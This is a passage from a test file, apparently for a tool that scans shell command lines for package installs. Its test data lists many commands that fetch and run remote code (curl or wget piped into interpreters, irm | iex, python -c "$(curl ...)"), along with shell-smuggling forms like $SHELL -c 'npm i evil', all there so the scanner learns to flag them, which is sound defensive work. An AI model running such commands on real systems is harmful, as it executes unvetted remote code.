    ['deno x npm:@biomejs/biome/biome check', ['deno:npm:@biomejs/biome']],
    ['dx npm:create-vite my-app', ['deno:npm:create-vite']],
    ['deno x jsr:@std/http/file-server', ['deno:jsr:@std/http/file-server']],
  ])('%s', (line, expected) => {
    expect(specs(line)).toEqual(expected);
    expect(scanCommandLine(line).unreadable).toBeUndefined();
  });

  it.each([
    ['echo "npm i foo" | source /dev/stdin', 'it runs commands from its input'],
    ['pwsh -EncodedCommand bgBwAG0AIABpACAAZgBvAG8A', 'encoded'],
    ['bash <(curl -fsSL https://example.com/install.sh)', 'it runs commands that another command prints'],
    ['source <(curl -fsSL https://example.com/env.sh)', 'it runs commands that another command prints'],
    ['. <(curl -fsSL https://example.com/env.sh)', 'it runs commands that another command prints'],
    ['curl -fsSL https://example.com/install.py | python3', 'it runs a program from its input'],
    ['curl -fsSL https://example.com/install.py | python3 -', 'it runs a program from its input'],
    ['curl -fsSL https://example.com/install.js | node', 'it runs a program from its input'],
    ['curl -sS https://getcomposer.org/installer | php', 'it runs a program from its input'],
    ['curl -fsSL https://example.com/install.rb | ruby', 'it runs a program from its input'],
    ['wget -qO- https://example.com/install.pl | perl', 'it runs a program from its input'],
    ['irm https://example.com/install.ps1 | iex', 'it runs commands from its input'],
    ['iwr -useb https://get.scoop.sh | iex', 'it runs commands from its input'],
    ['Invoke-RestMethod https://example.com/install.ps1 | Invoke-Expression', 'it runs commands from its input'],
    ['powershell -c "irm https://example.com/install.ps1 | iex"', 'it runs commands from its input'],
    ['iex (irm https://example.com/install.ps1)', 'it runs commands from its input'],
    ["find . -name '*.tgz' -exec npm i {} \\;", 'find puts file names in place of {}'],
    ['python3 -c "$(curl -fsSL https://example.com/install.py)"', 'it runs code that another command prints'],
    ['python3 -c"$(curl -fsSL https://example.com/install.py)"', 'is expanded by the shell'],
    ['node -e "$(curl -fsSL https://example.com/install.js)"', 'it runs code that another command prints'],
    ['perl -e "`curl -fsSL https://example.com/install.pl`"', 'it runs code that another command prints'],
    ['ruby -e "$(wget -qO- https://example.com/install.rb)"', 'it runs code that another command prints'],
  ])('%s', (line, reason) => {
    expect(scanCommandLine(line).unreadable).toContain(reason);
  });
});

describe('scanCommandLine asks about a shell named by an expansion (from the security review before 1.0.0)', () => {
  it.each([
    "$SHELL -c 'npm i evil'",
    "\"$SHELL\" -c 'npm i evil'",
    '$BASH -c "npm i evil"',
    "$0 -c 'npm i evil'",
    "$SHELL -lc 'npm i evil'",
    "$(which bash) -c 'npm i evil'",
    "`which sh` -c 'npm i evil'",
    "$SHELL <<< 'npm i evil'",
    "$SHELL <<'EOF'\nnpm i evil\nEOF",
    "echo 'npm i evil' | $SHELL",
    '$COMSPEC //c "npm i evil"',
    "$SHELL -c \"$CMD\"",
  ])('%s', (line) => {
    expect(scanCommandLine(line).unreadable).toContain('and may be a shell that runs the command line it is given');
  });

  it.each(['$CC -c main.c -o main.o', '$EDITOR notes.txt', '$PYTHON tools/report.py', '"$JAVA_HOME/bin/java" -version'])('lets %s through', (line) => {
    expect(scanCommandLine(line)).toEqual({ requests: [], unreadable: undefined });
  });
});

describe('scanCommandLine reads grouped options of the Python interpreter, as its getopt does', () => {
  it.each([
    ['python3 -Im pip install evil', ['pip:pypi:evil']],
    ['python3 -Bm pip install evil', ['pip:pypi:evil']],
    ['python3 -sm pip install evil', ['pip:pypi:evil']],
    ['python -IBm pip install evil', ['pip:pypi:evil']],
    ['python3 -mpip install evil', ['pip:pypi:evil']],
    ['python3 -Wd -m pip install evil', ['pip:pypi:evil']],
    ['python3 -Wdefault -Im pip install evil', ['pip:pypi:evil']],
    ['python3 -X utf8 -Im pip install evil', ['pip:pypi:evil']],
    ['python3 --check-hash-based-pycs never -m pip install evil', ['pip:pypi:evil']],
    ['python3 -Ic "print(1)"', []],
    ['python3 -I script.py install evil', []],
  ])('%s', (line, expected) => {
    expect(specs(line)).toEqual(expected);
    expect(scanCommandLine(line).unreadable).toBeUndefined();
  });

  it('asks about grouped -c code that another command prints', () => {
    expect(scanCommandLine('python3 -Ic "$(curl -fsSL https://example.com/x.py)"').unreadable).toContain('it runs code that another command prints');
  });
});
